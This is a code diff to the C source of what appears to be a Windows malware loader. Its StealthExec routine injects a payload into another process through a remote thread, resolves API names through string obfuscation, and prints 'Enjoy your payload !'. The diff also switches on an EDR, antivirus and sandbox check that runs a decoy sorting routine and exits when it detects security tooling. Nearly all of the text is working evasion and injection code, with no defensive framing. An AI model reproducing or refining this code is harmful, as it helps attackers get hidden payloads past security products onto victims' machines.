@@ -76,22 +76,15 @@ void StealthExec(HANDLE hProc)
     }
     else
     {
-        myDebug(DEBUG_INFO, "Thread creation succeed. Waiting 5 sec for thread to resume");
+        myDebug(DEBUG_SUCCESS, "Thread creation succeed. Enjoy your payload !");
         pWaitForSingleObject_t pWaitForSingleObject = (pWaitForSingleObject_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]WaitForSingleObject"));
         DWORD waitResult = pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // Wait for 5 seconds
-        pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
-        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
+        while (((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED)))
         {
-            myDebug(DEBUG_ERROR, "WaitForSingleObject failed!");
-            pTerminateThread_t pTerminateThread = (pTerminateThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]TerminateThread"));
-            pTerminateThread(hThreadRemote, 0); // Kill stuck thread
-            pCloseHandle(hThreadRemote);
-            return;
+            waitResult = pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // we wait :)
         }
-        pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
-        pResumeThread(hThreadRemote);
-        // pCloseHandle(hThreadRemote);
-        myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
+        pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
+        pCloseHandle(hThreadRemote);
     }
     return;
 }
@@ -100,11 +93,11 @@ void StealthExec(HANDLE hProc)
 int main(int argc, char *argv[])
 {
     // Check For EDR/AV/Sandbox env
-    // if (PerfomChecksEnv())
-    // {
-    //     SortNumbers();
-    //     return 0;
-    // }
+    if (PerfomChecksEnv())
+    {
+        SortNumbers();
+        return 0;
+    }
 
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
@@ -139,7 +132,7 @@ int main(int argc, char *argv[])
     pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
     pCloseHandle(pInfo.hProcess);
     pCloseHandle(pInfo.hThread);
-    myDebug(DEBUG_INFO, "%s is now running.", obfs_decode(DECKEY, procName));
+    myDebug(DEBUG_INFO, "%s has resumed normally.", obfs_decode(DECKEY, procName));
 
     return 0;
 }
